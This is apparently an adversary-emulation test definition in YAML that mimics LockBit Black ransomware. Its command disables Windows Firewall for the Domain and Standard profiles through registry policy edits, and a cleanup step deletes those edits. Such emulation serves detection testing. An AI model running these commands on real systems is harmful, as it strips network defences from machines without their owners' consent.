- id: 15b25fe3-39ce-5e58-80b0-ad84518d9960
  name: Soumaia ART Tests - LockBit Black - Unusual Windows firewall registry modification -cmd
  description: An adversary tries to modify the windows firewall registry (requires elevation)
  tactic: defense-impairment
  technique:
    attack_id: T1686
    name: Disable or Modify System Firewall
  platforms:
    windows:
      cmd:
        command: |-
          reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
          reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
        cleanup: |-
          reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /f >nul 2>&1
          reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /f >nul 2>&1
